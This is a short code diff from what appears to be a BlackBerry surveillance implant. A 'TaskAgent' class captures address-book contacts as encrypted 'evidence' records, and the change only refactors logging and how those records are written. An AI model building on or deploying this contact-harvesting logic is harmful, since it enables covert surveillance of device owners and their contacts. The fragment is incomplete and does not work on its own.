@@ -22,7 +22,6 @@ import net.rim.blackberry.api.pdap.BlackBerryContact;
 import net.rim.blackberry.api.pdap.BlackBerryPIMList;
 import net.rim.blackberry.api.pdap.PIMListListener;
 import net.rim.device.api.util.DataBuffer;
-import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -32,13 +31,13 @@ import blackberry.fs.Path;
 import blackberry.utils.Check;
 import blackberry.utils.Utils;
 
-// TODO: Auto-generated Javadoc
+
 /**
  * The Class ImAgent.
  */
 public final class TaskAgent extends Agent implements PIMListListener {
     //#ifdef DEBUG
-    static Debug debug = new Debug("TaskAgent", DebugLevel.VERBOSE);
+    static Debug debug = new Debug("TaskAgent", DebugLevel.INFORMATION);
     //#endif
 
     Markup markup;
@@ -600,9 +599,8 @@ public final class TaskAgent extends Agent implements PIMListListener {
 
             final byte[] payload = getContactPacket(contactList, contact);
 
-            evidence.createEvidence(null, EvidenceType.ADDRESSBOOK);
-            evidence.writeEvidence(payload);
-            evidence.close();
+            evidence.atomicWriteOnce(null, EvidenceType.ADDRESSBOOK, payload);
+
         } catch (final Exception ex) {
             //#ifdef DEBUG
             debug.error(ex);
